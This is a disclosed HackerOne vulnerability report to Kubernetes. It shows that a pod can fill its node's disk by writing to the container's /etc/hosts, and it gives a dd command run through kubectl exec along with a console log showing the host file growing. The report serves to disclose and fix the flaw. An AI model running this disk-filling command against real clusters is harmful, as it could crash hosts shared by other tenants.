# Node disk DOS by writing to container /etc/hosts

## Report Details
- **Report ID**: 867699
- **URL**: https://hackerone.com/reports/867699
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-07T07:11:29.039Z
- **Disclosed**: 2020-07-22T01:34:00.937Z

## Reporter
- **Username**: kebe
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
Pod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.
A normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.
Not only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.

## Kubernetes Version:
<=1.18

## Component Version:
Docker 19.03

## Steps To Reproduce:

  1. use kubectl create a pod like kubectl run 
  2. run `kubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M`
  3. run `df -h /var/lib/kubelet` on host that pod running, you can see the disk avaliable space are decreasing until the disk full.

## Supporting Material/References:
```console
[root@kebe-sm-315 ~]# kubectl exec -it rate-c848c5c8b-5b8vm sh
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl kubectl exec [POD] -- [COMMAND] instead.
Defaulting container name to rate.
Use 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.
/ # df -h
Filesystem                Size      Used Available Use% Mounted on
/dev/mapper/docker-8:16-67108930-710dfe5c781bd17e11968371b9d0f84641a2efde95c68a47eddf9ae518e768d1
                         10.0G     40.3M     10.0G   0% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                     9.7G         0      9.7G   0% /sys/fs/cgroup
/dev/mapper/centos-root
                         53.0G     28.6G     24.4G  54% /dev/termination-log
/dev/sdb                100.0G     40.9G     59.1G  41% /etc/resolv.conf
/dev/sdb                100.0G     40.9G     59.1G  41% /etc/hostname
/dev/mapper/centos-root
                         53.0G     28.6G     24.4G  54% /etc/hosts
shm                      64.0M      8.0K     64.0M   0% /dev/shm
tmpfs                     9.7G     12.0K      9.7G   0% /var/run/secrets/kubernetes.io/serviceaccount
tmpfs                     9.7G         0      9.7G   0% /proc/acpi
tmpfs                    64.0M         0     64.0M   0% /proc/kcore
tmpfs                    64.0M         0     64.0M   0% /proc/keys
tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
tmpfs                    64.0M         0     64.0M   0% /proc/timer_stats
tmpfs                    64.0M         0     64.0M   0% /proc/sched_debug
tmpfs                     9.7G         0      9.7G   0% /proc/scsi
tmpfs                     9.7G         0      9.7G   0% /sys/firmware

[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al
总用量 12
drwxr-xr-x  5 root root   71 5月   7 12:29 .
drwxr-x--- 50 root root 4096 5月   7 12:29 ..
drwxr-x---  5 root root   55 5月   7 12:31 containers
-rw-r--r--  1 root root  270 5月   7 12:31 etc-hosts
drwxr-x---  3 root root   37 5月   7 12:29 plugins
drwxr-xr-x  4 root root   65 5月   7 12:29 volumes
[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=100 bs=1M
Defaulting container name to rate.
Use 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.
100+0 records in
100+0 records out
[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al
总用量 102408
drwxr-xr-x  5 root root        71 5月   7 12:29 .
drwxr-x--- 50 root root      4096 5月   7 12:29 ..
drwxr-x---  5 root root        55 5月   7 12:31 containers
-rw-r--r--  1 root root 104857600 5月   7 15:06 etc-hosts
drwxr-x---  3 root root        37 5月   7 12:29 plugins
drwxr-xr-x  4 root root        65 5月   7 12:29 volumes
```

  * [attachment / reference]

## Impact

If someone create a pod on a public cloud with kubernetes, the host of the provider may panic due to disk full.

## Attachments
No attachments
